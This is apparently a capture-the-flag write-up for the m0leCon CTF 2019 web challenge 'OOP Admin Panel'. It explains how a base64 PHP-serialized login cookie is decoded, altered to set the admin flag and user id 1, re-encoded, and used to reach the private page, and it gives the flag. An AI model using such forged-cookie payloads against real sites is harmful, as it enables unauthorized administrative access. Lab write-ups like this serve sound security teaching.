<h1>m0leCon CTF 2019 â€“ OOP Admin Panel</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 54</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>This is my first website, can you prove it to be secure?</p>
  
  <p>Author: @andreossido</p>
  
  <p>http://10.255.0.1:8010/</p>
</blockquote>

<h2>Solution</h2>

<p>Connecting to the website you can see the following message.</p>

<p>```
Welcome</p>

<p>I'm admin of this site.
This is my first website... I think it's enough secure, but I didn't study sql yet.
Can you test it for me?
In private page there is a surprise for you!
```</p>

<p>Registering a user and analyzing the cookies will let you to discever the <code>login</code> cookie with a base64 content.</p>

<p><code>
Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtpOjI7czo4OiJ1c2VybmFtZSI7czo1OiJhYWFhYSI7czo1OiJhZG1pbiI7YjowO30=
</code></p>

<p>Decoding it will give you the following PHP serialized class.</p>

<p><code>
O:4:"User":3:{s:2:"id";i:2;s:8:"username";s:5:"aaaaa";s:5:"admin";b:0;}
</code></p>

<p>You can craft the following malicious serialized class to escalate privileges.</p>

<p><code>
O:4:"User":3:{s:2:"id";i:1;s:8:"username";s:5:"admin";s:5:"admin";b:1;}
</code></p>

<p>Then encode it in base64.</p>

<p><code>
Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtpOjE7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7czo1OiJhZG1pbiI7YjoxO30
</code></p>

<p>Changing the cookie with the encoded malicious payload and visiting the private section will give you the flag.</p>

<p><code>
ptm{Cl455_S3r14l1z4t10n_15_B34ut1ful}
</code></p>
